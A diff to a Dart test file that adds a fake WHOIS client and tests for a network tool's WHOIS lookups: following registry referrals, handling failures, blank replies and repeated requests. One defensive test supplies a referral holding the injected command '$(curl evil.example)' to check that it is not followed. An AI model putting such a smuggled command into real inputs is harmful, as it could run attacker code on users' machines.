@@ -9,6 +9,7 @@ import 'package:omniterm/data/network/network_probe.dart';
 import 'package:omniterm/domain/network_tools.dart';
 import 'package:omniterm/platform/secret_store.dart';
 import 'package:omniterm/ui/view_model/app_state.dart';
+import 'package:omniterm/data/network/whois_client.dart';
 import 'package:omniterm/ui/view_model/network_view_model.dart';
 
 import 'support/fake_secure_storage.dart';
@@ -113,6 +114,24 @@ Uint8List nxdomainResponse() {
   return out.toBytes();
 }
 
+/// Answers WHOIS queries from a script, recording who was asked.
+class FakeWhois implements WhoisClient {
+  FakeWhois(this.replies);
+
+  /// Server host to reply. A [WhoisException] value is thrown instead of returned.
+  final Map<String, Object> replies;
+
+  final List<(String server, String target)> asked = [];
+
+  @override
+  Future<String> query(String server, String target) async {
+    asked.add((server, target));
+    final reply = replies[server];
+    if (reply is WhoisException) throw reply;
+    return (reply as String?) ?? '';
+  }
+}
+
 void main() {
   late AppDatabase db;
   late AppRepository repo;
@@ -129,9 +148,9 @@ void main() {
     await db.close();
   });
 
-  Future<NetworkViewModel> boot(FakeProbe probe) async {
+  Future<NetworkViewModel> boot(FakeProbe probe, {WhoisClient? whois}) async {
     await app.start();
-    final vm = NetworkViewModel(app, probe: probe);
+    final vm = NetworkViewModel(app, probe: probe, whois: whois);
     await vm.start();
     await Future<void>.delayed(Duration.zero);
     return vm;
@@ -466,5 +485,141 @@ void main() {
     expect(vm.activeTab, NetworkTab.ping);
     expect(vm.pingTarget, '192.168.1.6');
     vm.dispose();
+  });
+
+  group('whois', () {
+    test('a domain is asked of IANA, then of the registry it names', () async {
+      // The first answer is a delegation record; the record a user came for is at the registry.
+      final whois = FakeWhois({
+        'whois.iana.org': 'domain: COM\nrefer: whois.verisign-grs.com\n',
+        'whois.verisign-grs.com': 'Domain Name: EXAMPLE.COM\nRegistrar: Someone\n',
+      });
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = 'example.com';
+      await vm.runWhois();
+
+      expect(whois.asked, [('whois.iana.org', 'example.com'), ('whois.verisign-grs.com', 'example.com')]);
+      // Both replies are kept: the registry says who holds the delegation, the registrar says who
+      // registered it, and dropping either loses a different fact.
+      expect(vm.whoisResult, contains('domain: COM'));
+      expect(vm.whoisResult, contains('Registrar: Someone'));
+      expect(vm.whoisServers, ['whois.iana.org', 'whois.verisign-grs.com']);
+      vm.dispose();
+    });
+
+    test('an address starts at a regional registry', () async {
+      final whois = FakeWhois({'whois.arin.net': 'NetRange: 8.8.8.0 - 8.8.8.255\n'});
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = '8.8.8.8';
+      await vm.runWhois();
+
+      expect(whois.asked.single.$1, 'whois.arin.net');
+      expect(vm.whoisServers, ['whois.arin.net']);
+      vm.dispose();
+    });
+
+    test('a reply with no referral is the answer', () async {
+      final whois = FakeWhois({'whois.iana.org': 'Domain Name: EXAMPLE.COM\n'});
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = 'example.com';
+      await vm.runWhois();
+
+      expect(whois.asked, hasLength(1));
+      expect(vm.error, isNull);
+      vm.dispose();
+    });
+
+    test('a referral that is not a hostname is not followed', () async {
+      // The referral is free text from a remote server and decides what this app connects to next.
+      final whois = FakeWhois({'whois.iana.org': r'refer: $(curl evil.example)' '\n'});
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = 'example.com';
+      await vm.runWhois();
+
+      expect(whois.asked, hasLength(1));
+      expect(vm.whoisResult, contains('refer:'));
+      vm.dispose();
+    });
+
+    test('a referral back to the server that gave it is not followed', () async {
+      // Registries do point at themselves, and a second identical query is a wasted round trip.
+      final whois = FakeWhois({'whois.iana.org': 'refer: whois.iana.org\n'});
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = 'example.com';
+      await vm.runWhois();
+
+      expect(whois.asked, hasLength(1));
+      vm.dispose();
+    });
+
+    test('a referred server that fails leaves the first answer standing, and says why', () async {
+      // The registry reply is still a real answer; discarding it because the second hop failed
+      // would turn a partial result into nothing.
+      final whois = FakeWhois({
+        'whois.iana.org': 'domain: COM\nrefer: whois.verisign-grs.com\n',
+        'whois.verisign-grs.com': const WhoisException('Connection refused'),
+      });
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = 'example.com';
+      await vm.runWhois();
+
+      expect(vm.whoisResult, contains('domain: COM'));
+      expect(vm.whoisResult, contains('did not answer'));
+      expect(vm.whoisServers, ['whois.iana.org']);
+      expect(vm.error, isNull, reason: 'a partial answer is not a failed lookup');
+      vm.dispose();
+    });
+
+    test('a first hop that fails is reported as an error, not as an empty record', () async {
+      final whois = FakeWhois({'whois.iana.org': const WhoisException('Network unreachable')});
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = 'example.com';
+      await vm.runWhois();
+
+      expect(vm.error, contains('Network unreachable'));
+      expect(vm.whoisResult, isEmpty);
+      vm.dispose();
+    });
+
+    test('a blank reply says nothing came back rather than showing an empty pane', () async {
+      final whois = FakeWhois({'whois.iana.org': '   \n'});
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = 'example.com';
+      await vm.runWhois();
+
+      expect(vm.error, contains('No registration records'));
+      vm.dispose();
+    });
+
+    test('an empty target asks nothing', () async {
+      final whois = FakeWhois({});
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = '   ';
+      await vm.runWhois();
+
+      expect(whois.asked, isEmpty);
+      expect(vm.error, contains('Enter a domain'));
+      vm.dispose();
+    });
+
+    test('a second lookup while one is running is ignored', () async {
+      final whois = FakeWhois({'whois.iana.org': 'Domain Name: EXAMPLE.COM\n'});
+      final vm = await boot(FakeProbe(), whois: whois);
+      vm.whoisTarget = 'example.com';
+
+      await Future.wait([vm.runWhois(), vm.runWhois()]);
+
+      expect(whois.asked, hasLength(1));
+      vm.dispose();
+    });
+
+    test('a host from the scan can be sent straight to WHOIS', () async {
+      final vm = await boot(FakeProbe(), whois: FakeWhois({}));
+      vm.useHost('192.168.1.9', NetworkTab.whois);
+
+      expect(vm.whoisTarget, '192.168.1.9');
+      expect(vm.activeTab, NetworkTab.whois);
+      vm.dispose();
+    });
   });
 }
